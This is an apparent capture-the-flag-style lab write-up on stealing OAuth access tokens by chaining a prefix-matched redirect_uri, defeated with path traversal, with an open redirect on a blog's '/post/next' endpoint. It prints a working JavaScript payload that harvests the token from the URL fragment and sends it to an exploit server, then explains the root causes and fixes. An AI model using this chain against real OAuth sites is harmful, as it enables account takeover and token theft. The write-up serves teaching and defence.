# Lab 4 Stealing OAuth access tokens via an open redirect

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note `You cannot access the admin's API key by simply logging in to their account on the client application.`

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`.

***

## Feature Being Attacked

Standard OAuth login. This time, the OAuth server **does** whitelist `redirect_uri` - but only checks it loosely (prefix-based), not with exact-match validation.

## Key Vulnerabilities Chained Together

**1. Path traversal in `redirect_uri` validation**\
The whitelist check only verifies the `redirect_uri` _starts with_ the registered value. Appending `/../` lets you escape the intended path while still passing the check:

```
redirect_uri=https://LAB-ID/oauth-callback/../post/next?path=...
```

This resolves to `/post/next?path=...` - a completely different endpoint on the same domain.

**2. Open redirect on `/post/next`**\
The blog's "Next post" feature redirects based on a `path` query parameter with **no validation** that it stays on-domain:

```
GET /post/next?path=https://attacker.com
```

→ redirects anywhere, including external domains.

**Combined**, these let you keep the OAuth server's domain whitelist happy (`redirect_uri` still starts with the trusted host) while ultimately sending the browser - and the fragment carrying the access token - to an attacker-controlled destination.

## Full Exploit Chain

```
GET /auth?client_id=...
    &redirect_uri=https://LAB-ID/oauth-callback/../post/next?path=https://EXPLOIT-ID.exploit-server.net/exploit
    &response_type=token&scope=openid%20profile%20email
```

1. OAuth server validates `redirect_uri` → passes (still starts with trusted host)
2. User authenticates (session already active, so this is silent) → OAuth server redirects to:\
   `.../post/next?path=https://exploit-server.net/exploit#access_token=...`
3. Blog server sees `?path=...` → issues its own open redirect (fragment isn't sent to server, but the browser **carries it forward** automatically on navigation)
4. Browser lands on `https://exploit-server.net/exploit#access_token=...`
5. Attacker's JS on that page reads `location.hash` and exfiltrates it

## The Exploit Server Payload

```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://LAB-ID/oauth-callback/../post/next?path=https://EXPLOIT-ID.exploit-server.net/exploit&response_type=token&nonce=NONCE&scope=openid%20profile%20email'
    } else {
        window.location = '/?' + document.location.hash.substr(1)
    }
</script>
```

* First load (no hash) → kicks off the full OAuth chain
* Second load (chain completes, lands back here with hash) → forwards token to exploit server's own `/` as a query param → visible in the **access log**

**Important:** Use `window.location` for top-level navigation, not an `<iframe>` - OAuth login pages often block framing (`X-Frame-Options`/CSP), which silently kills the flow.

## Root Cause

Two independent flaws, individually low-severity, combined into full account takeover:

1. **Weak `redirect_uri` validation** - prefix/substring match instead of exact match, defeatable via path traversal (`/../`)
2. **Open redirect** on an unrelated internal endpoint (`/post/next`), providing the actual off-domain hop

Neither flaw alone leaks the token to an attacker - it's the **chaining** that matters.

## The Fix

* **`redirect_uri` validation:** exact string match against the registered value - no prefix matching, no traversal sequences allowed, normalize/canonicalize the path before comparing
* **Fix the open redirect independently:** validate `path` against an allowlist of internal paths, or require it to be a relative path only (reject anything starting with `http://`/`https://` or `//`)
* Defense in depth: even a perfectly validated `redirect_uri` is only as safe as every other redirect-capable endpoint on that domain - an open redirect anywhere on the trusted host can be chained the same way

## One-Line Takeaway

> `redirect_uri` validation must be an **exact match**, not "starts with." And any **open redirect anywhere on the client's domain** becomes a way to defeat even a whitelisted `redirect_uri`, because the OAuth server only checks the domain - not where the client's own code ultimately sends the browser afterward.
